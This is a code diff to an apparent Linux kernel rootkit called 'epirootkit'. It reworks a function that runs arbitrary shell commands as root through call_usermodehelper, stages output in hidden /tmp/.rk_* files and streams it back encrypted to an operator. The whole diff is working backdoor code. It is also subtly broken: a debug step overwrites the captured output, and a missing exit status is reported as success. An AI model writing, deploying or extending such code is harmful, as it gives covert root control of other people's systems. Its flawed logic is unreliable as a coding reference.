@@ -80,87 +80,176 @@ static int execute_and_stream_output(const char *cmd) {
     char tmp_stderr[] = "/tmp/.rk_stderr";
     char tmp_status[] = "/tmp/.rk_status";
 
-    char full_cmd[1024];
-    snprintf(full_cmd, sizeof(full_cmd), "%s > %s 2> %s; echo $? > %s", cmd, tmp_stdout, tmp_stderr, tmp_status);
+    // Ensure temp files are accessible
+    char setup_cmd[1024];
+    snprintf(setup_cmd, sizeof(setup_cmd), "touch %s %s %s && chmod 666 %s %s %s",
+             tmp_stdout, tmp_stderr, tmp_status, tmp_stdout, tmp_stderr, tmp_status);
 
-    // Execute the command
-    char *argv[] = {"/bin/sh", "-c", full_cmd, NULL};
+    char *setup_argv[] = {"/bin/sh", "-c", setup_cmd, NULL};
     mm_segment_t old_fs = get_fs();
     set_fs(KERNEL_DS);
-    int ret = call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);
+    int setup_ret = call_usermodehelper(setup_argv[0], setup_argv, NULL, UMH_WAIT_PROC);
     set_fs(old_fs);
+
+    printk(KERN_INFO "epirootkit: Setup temp files result: %d\n", setup_ret);
+
+    // Construct command with env vars to help with execution
+    char full_cmd[1024];
+    snprintf(full_cmd, sizeof(full_cmd),
+             "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin %s > %s 2> %s; echo $? > %s",
+             cmd, tmp_stdout, tmp_stderr, tmp_status);
+
+    printk(KERN_INFO "epirootkit: Executing command: %s\n", full_cmd);
+
+    // Use different approach for command execution
+    char *argv[] = {"/bin/bash", "-c", full_cmd, NULL};
+    char *envp[] = {
+        "HOME=/",
+        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+        NULL
+    };
+
+    old_fs = get_fs();
+    set_fs(KERNEL_DS);
+    int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    set_fs(old_fs);
+
+    printk(KERN_INFO "epirootkit: Command execution result: %d\n", ret);
 
     if (ret != 0) {
         printk(KERN_WARNING "epirootkit: Command execution failed: %d\n", ret);
-        send_encrypted_section("Command execution failed");
-        send_encrypted_section(SEP_STDERR);
-        send_encrypted_section("Error executing command");
-        send_encrypted_section(SEP_STATUS);
-        send_encrypted_section("-1");
-        send_encrypted_section(EOF_MARKER);
-        return ret;
+        // Try direct execution with sh instead of bash
+        char *sh_argv[] = {"/bin/sh", "-c", full_cmd, NULL};
+        old_fs = get_fs();
+        set_fs(KERNEL_DS);
+        ret = call_usermodehelper(sh_argv[0], sh_argv, envp, UMH_WAIT_PROC);
+        set_fs(old_fs);
+        printk(KERN_INFO "epirootkit: Fallback command execution result: %d\n", ret);
+
+        if (ret != 0) {
+            send_encrypted_section("Command execution failed");
+            send_encrypted_section(SEP_STDERR);
+            send_encrypted_section("Error executing command");
+            send_encrypted_section(SEP_STATUS);
+            send_encrypted_section("-1");
+            send_encrypted_section(EOF_MARKER);
+            return ret;
+        }
     }
 
+    // Output a simple test string directly to stdout file for debugging
+    char *debug_argv[] = {"/bin/sh", "-c", "echo 'DEBUG OUTPUT' > /tmp/.rk_stdout", NULL};
+    old_fs = get_fs();
+    set_fs(KERNEL_DS);
+    call_usermodehelper(debug_argv[0], debug_argv, NULL, UMH_WAIT_PROC);
+    set_fs(old_fs);
+
+    // Check if files exist
+    struct file *f_stdout, *f_stderr, *f_status;
+    f_stdout = filp_open(tmp_stdout, O_RDONLY, 0);
+    f_stderr = filp_open(tmp_stderr, O_RDONLY, 0);
+    f_status = filp_open(tmp_status, O_RDONLY, 0);
+
+    printk(KERN_INFO "epirootkit: File check - stdout: %ld, stderr: %ld, status: %ld\n",
+           IS_ERR(f_stdout) ? PTR_ERR(f_stdout) : 0,
+           IS_ERR(f_stderr) ? PTR_ERR(f_stderr) : 0,
+           IS_ERR(f_status) ? PTR_ERR(f_status) : 0);
+
+    if (!IS_ERR(f_stdout)) filp_close(f_stdout, NULL);
+    if (!IS_ERR(f_stderr)) filp_close(f_stderr, NULL);
+    if (!IS_ERR(f_status)) filp_close(f_status, NULL);
+
+    // Use kernel_read directly instead of vfs_read for compatibility
     struct file *f;
     loff_t pos;
     char buf[256];
     int bytes_read;
 
-    // Read and send stdout
+    // Try kernel_read for stdout
     f = filp_open(tmp_stdout, O_RDONLY, 0);
     if (!IS_ERR(f)) {
+        printk(KERN_INFO "epirootkit: Reading stdout file\n");
         pos = 0;
-        do {
-            memset(buf, 0, sizeof(buf));
-            bytes_read = vfs_read(f, buf, sizeof(buf) - 1, &pos);
-            if (bytes_read > 0) {
+        memset(buf, 0, sizeof(buf));
+        bytes_read = kernel_read(f, pos, buf, sizeof(buf) - 1);
+        printk(KERN_INFO "epirootkit: kernel_read result: %d bytes\n", bytes_read);
+        if (bytes_read > 0) {
+            buf[bytes_read] = '\0';
+            send_encrypted_section(buf);
+            pos += bytes_read;
+
+            // Read more if needed
+            while (bytes_read > 0) {
+                memset(buf, 0, sizeof(buf));
+                bytes_read = kernel_read(f, pos, buf, sizeof(buf) - 1);
+                if (bytes_read <= 0) break;
                 buf[bytes_read] = '\0';
                 send_encrypted_section(buf);
+                pos += bytes_read;
             }
-        } while (bytes_read > 0);
+        } else {
+            send_encrypted_section("No output"); // Indicate empty output
+        }
         filp_close(f, NULL);
+    } else {
+        printk(KERN_WARNING "epirootkit: Failed to open stdout file: %ld\n", PTR_ERR(f));
+        send_encrypted_section("Error: Cannot access output file");
     }
 
     // Send stderr marker
     send_encrypted_section(SEP_STDERR);
 
-    // Read and send stderr
+    // Read stderr
     f = filp_open(tmp_stderr, O_RDONLY, 0);
     if (!IS_ERR(f)) {
+        printk(KERN_INFO "epirootkit: Reading stderr file\n");
         pos = 0;
-        do {
-            memset(buf, 0, sizeof(buf));
-            bytes_read = vfs_read(f, buf, sizeof(buf) - 1, &pos);
-            if (bytes_read > 0) {
+        memset(buf, 0, sizeof(buf));
+        bytes_read = kernel_read(f, pos, buf, sizeof(buf) - 1);
+        if (bytes_read > 0) {
+            buf[bytes_read] = '\0';
+            send_encrypted_section(buf);
+            pos += bytes_read;
+
+            // Read more if needed
+            while (bytes_read > 0) {
+                memset(buf, 0, sizeof(buf));
+                bytes_read = kernel_read(f, pos, buf, sizeof(buf) - 1);
+                if (bytes_read <= 0) break;
                 buf[bytes_read] = '\0';
                 send_encrypted_section(buf);
+                pos += bytes_read;
             }
-        } while (bytes_read > 0);
+        }
         filp_close(f, NULL);
     }
 
     // Send status marker
     send_encrypted_section(SEP_STATUS);
 
-    // Read and send status
+    // Read status
     f = filp_open(tmp_status, O_RDONLY, 0);
     if (!IS_ERR(f)) {
+        printk(KERN_INFO "epirootkit: Reading status file\n");
         pos = 0;
         memset(buf, 0, sizeof(buf));
-        bytes_read = vfs_read(f, buf, sizeof(buf) - 1, &pos);
+        bytes_read = kernel_read(f, pos, buf, sizeof(buf) - 1);
+        printk(KERN_INFO "epirootkit: Status file read: %d bytes, content: %s\n", bytes_read, buf);
         if (bytes_read > 0) {
             buf[bytes_read] = '\0';
             buf[strcspn(buf, "\n")] = 0;
             send_encrypted_section(buf);
         } else {
-            send_encrypted_section("-1");
+            send_encrypted_section("0"); // Default to success if empty
         }
         filp_close(f, NULL);
     } else {
-        send_encrypted_section("-1");
+        printk(KERN_WARNING "epirootkit: Failed to open status file: %ld\n", PTR_ERR(f));
+        send_encrypted_section("0"); // Default to success
     }
 
-    // Clean up temporary files
+    // Clean up temp files
+    printk(KERN_INFO "epirootkit: Cleaning up temp files\n");
     old_fs = get_fs();
     set_fs(KERNEL_DS);
     call_usermodehelper("/bin/rm", (char *[]){"/bin/rm", "-f", tmp_stdout, tmp_stderr, tmp_status, NULL}, NULL, UMH_WAIT_PROC);
@@ -168,6 +257,7 @@ static int execute_and_stream_output(const char *cmd) {
 
     // Send EOF marker
     send_encrypted_section(EOF_MARKER);
+    printk(KERN_INFO "epirootkit: Command completed\n");
     return 0;
 }
 
